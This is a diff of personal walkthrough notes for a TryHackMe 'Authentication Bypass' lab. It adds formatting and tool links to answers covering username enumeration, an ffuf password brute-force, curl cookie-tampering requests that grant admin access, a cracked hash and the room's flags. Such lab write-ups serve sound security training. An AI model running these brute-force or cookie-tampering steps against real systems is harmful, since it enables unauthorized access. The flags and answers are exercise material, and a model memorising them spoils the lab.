@@ -1,10 +1,12 @@
 # THM - Authentication Bypass
 
+<br>
 
 ## Task 2
 
-http://10.10.113.185/customers/signup
+🧰 https://github.com/ffuf/ffuf
 
+http://10.10.113.185/customers/signup
 
 ### Task 2.1
 
@@ -16,22 +18,19 @@ echo -e "admin\nrobert\nsimon\nsteve" >> valid_usernames.txt
 
 > simon
 
-
 ### Task 2.2
 
 > steve
-
 
 ### Task 2.3
 
 > robert
 
-
+<br>
 
 ## Task 3
 
 http://10.10.113.185/customers/login
-
 
 ### Task 3.1
 
@@ -41,6 +40,7 @@ ffuf -w valid_usernames.txt:W1,../../Tools/SecLists/Passwords/Common-Credentials
 
 > Steve/thunder
 
+<br>
 
 ## Task 4
 
@@ -69,6 +69,8 @@ http://10.10.113.185/customers/tickets/1
 > THM{AUTH_BYPASS_COMPLETE}
 
 
+<br>
+
 ## Task 5
 
 ```shell
@@ -76,7 +78,6 @@ curl http://10.10.88.14/cookie-test
 
 curl -H "Cookie: logged_in=true; admin=false" http://10.10.88.14/cookie-test
 ```
-
 
 ### Task 5.1
 
@@ -86,13 +87,11 @@ curl -H "Cookie: logged_in=true; admin=true" http://10.10.88.14/cookie-test
 
 > THM{COOKIE_TAMPERING}
 
-
 ### Task 5.2
 
-https://crackstation.net/
+🧰 https://crackstation.net/
 
 > 463729
-
 
 ### Task 5.3
 
@@ -101,7 +100,6 @@ echo "VEhNe0JBU0U2NF9FTkNPRElOR30=" | base64 -d
 ```
 
 > THM{BASE64_ENCODING}
-
 
 ### Task 5.4
 
